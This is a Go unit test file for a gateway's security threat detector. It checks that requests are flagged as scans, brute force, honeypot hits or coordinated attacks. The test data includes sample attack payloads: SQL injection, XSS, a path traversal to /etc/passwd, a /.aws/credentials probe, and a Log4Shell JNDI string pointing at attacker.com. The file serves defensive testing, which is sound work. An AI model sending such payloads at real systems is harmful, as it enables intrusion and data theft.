package api

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/gsoultan/gateon/internal/telemetry"
	gateonv1 "github.com/gsoultan/gateon/proto/gateon/v1"
	"github.com/stretchr/testify/assert"
)

func TestSecurityThreatDetector_Comprehensive(t *testing.T) {
	ctx := context.Background()
	now := time.Now()

	tests := []struct {
		name           string
		traces         []telemetry.TraceRecord
		expectedAnom   int
		expectedType   string
		expectedReason string
	}{
		{
			name: "SQL Injection attempt",
			traces: []telemetry.TraceRecord{
				{SourceIP: "1.1.1.1", Path: "/api/user?id=1' OR '1'='1", Method: "GET", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_scan",
			expectedReason: "suspicious paths/payloads",
		},
		{
			name: "XSS attempt",
			traces: []telemetry.TraceRecord{
				{SourceIP: "2.2.2.2", Path: "/search?q=<script>alert(1)</script>", Method: "GET", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_scan",
			expectedReason: "suspicious paths/payloads",
		},
		{
			name: "Brute force",
			traces: func() []telemetry.TraceRecord {
				var r []telemetry.TraceRecord
				for range 15 {
					r = append(r, telemetry.TraceRecord{SourceIP: "3.3.3.3", Path: "/login", Method: "POST", Status: "401 Unauthorized", Timestamp: now})
				}
				return r
			}(),
			expectedAnom:   1,
			expectedType:   "brute_force_attempt",
			expectedReason: "authentication failures",
		},
		{
			name: "Known scanning tool",
			traces: []telemetry.TraceRecord{
				{SourceIP: "4.4.4.4", Path: "/", Method: "GET", UserAgent: "sqlmap/1.4.11", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_threat",
			expectedReason: "Suspicious User-Agent",
		},
		{
			name: "Sensitive file access",
			traces: []telemetry.TraceRecord{
				{SourceIP: "5.5.5.5", Path: "/.aws/credentials", Method: "GET", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "honeypot_hit",
			expectedReason: "honeypot/trap paths",
		},
		{
			name: "Log4Shell attempt",
			traces: []telemetry.TraceRecord{
				{SourceIP: "6.6.6.6", Path: "/?q=${jndi:ldap://attacker.com/a}", Method: "GET", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_scan",
			expectedReason: "suspicious paths/payloads",
		},
		{
			name: "Path traversal",
			traces: []telemetry.TraceRecord{
				{SourceIP: "7.7.7.7", Path: "/../../etc/passwd", Method: "GET", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_scan",
			expectedReason: "suspicious paths/payloads",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			detector := &SecurityThreatDetector{Threshold: 10}

			// Manually populate IPStats as AnomalyAnalysisEngine would
			ipStats := make(map[string]*IPStats)
			for _, tr := range tt.traces {
				stats, ok := ipStats[tr.SourceIP]
				if !ok {
					stats = &IPStats{
						UniquePaths: make(map[string]struct{}),
						UserAgents:  make(map[string]struct{}),
						Methods:     make(map[string]int),
						Referers:    make(map[string]int),
					}
					ipStats[tr.SourceIP] = stats
				}
				stats.TotalRequests++
				stats.UniquePaths[tr.Path] = struct{}{}
				if tr.UserAgent != "" {
					stats.UserAgents[tr.UserAgent] = struct{}{}
				}
				if tr.Referer != "" {
					stats.Referers[tr.Referer]++
				}
				if tr.Status != "" {
					if tr.Status == "401 Unauthorized" {
						stats.Error401++
					}
				}
				stats.LastSeen = tr.Timestamp
			}

			data := &DiagnosticData{IPStats: ipStats}
			anomalies := detector.Detect(ctx, data)

			// Filter anomalies for this specific test case's IP(s)
			var foundAnomalies []*gateonv1.Anomaly
			for _, a := range anomalies {
				for _, tr := range tt.traces {
					if a.Source == tr.SourceIP {
						foundAnomalies = append(foundAnomalies, a)
						break
					}
				}
			}

			assert.Equal(t, tt.expectedAnom, len(foundAnomalies), "Should have exactly %d anomalies for IP(s)", tt.expectedAnom)
			if tt.expectedAnom > 0 {
				a := foundAnomalies[0]
				assert.Equal(t, tt.expectedType, a.Type)
				assert.Contains(t, strings.ToLower(a.Description), strings.ToLower(tt.expectedReason))
			}
		})
	}
}

func TestSecurityThreatDetector_CoordinatedAttack(t *testing.T) {
	ctx := context.Background()
	now := time.Now()

	t.Run("Legitimate common sequence - False Positive", func(t *testing.T) {
		detector := &SecurityThreatDetector{Threshold: 10}

		var traces []telemetry.TraceRecord
		for i := 1; i <= 4; i++ {
			ip := fmt.Sprintf("192.168.1.%d", i)
			traces = append(traces, telemetry.TraceRecord{SourceIP: ip, Path: "/", Method: "GET", Timestamp: now})
			traces = append(traces, telemetry.TraceRecord{SourceIP: ip, Path: "/login", Method: "GET", Timestamp: now.Add(time.Second)})
			traces = append(traces, telemetry.TraceRecord{SourceIP: ip, Path: "/dashboard", Method: "GET", Timestamp: now.Add(2 * time.Second)})
		}
		// Set different UAs to avoid triggering identical UA signal
		for i := range traces {
			traces[i].UserAgent = fmt.Sprintf("UA-%d", i/3)
		}

		data := &DiagnosticData{
			Traces:  traces,
			IPStats: make(map[string]*IPStats),
		}

		anomalies := detector.Detect(ctx, data)
		coordinatedAnoms := 0
		for _, a := range anomalies {
			if a.Type == "coordinated_attack" {
				coordinatedAnoms++
			}
		}
		assert.Equal(t, 0, coordinatedAnoms, "Should NOT detect coordinated attack for legitimate sequence with different UAs")
	})

	t.Run("Actual coordinated attack - True Positive", func(t *testing.T) {
		detector := &SecurityThreatDetector{Threshold: 10}

		var traces []telemetry.TraceRecord
		ua := "Bot-UA-1.0"
		ja3 := "771,4865-4866-4867,0-23-65281-10-11-35-16-5-13-18-51-45-43-21,29-23-24,0"
		for i := 1; i <= 4; i++ {
			ip := fmt.Sprintf("10.0.0.%d", i)
			traces = append(traces, telemetry.TraceRecord{SourceIP: ip, Path: "/wp-login.php", Method: "POST", Timestamp: now, UserAgent: ua, JA3: ja3})
			traces = append(traces, telemetry.TraceRecord{SourceIP: ip, Path: "/xmlrpc.php", Method: "POST", Timestamp: now.Add(time.Millisecond), UserAgent: ua, JA3: ja3})
			traces = append(traces, telemetry.TraceRecord{SourceIP: ip, Path: "/admin-ajax.php", Method: "POST", Timestamp: now.Add(2 * time.Millisecond), UserAgent: ua, JA3: ja3})
		}

		data := &DiagnosticData{
			Traces:  traces,
			IPStats: make(map[string]*IPStats),
		}

		anomalies := detector.Detect(ctx, data)
		coordinatedAnoms := 0
		for _, a := range anomalies {
			if a.Type == "coordinated_attack" {
				coordinatedAnoms++
			}
		}
		assert.Equal(t, 1, coordinatedAnoms, "Should detect coordinated attack with same UA and JA3")
	})
}
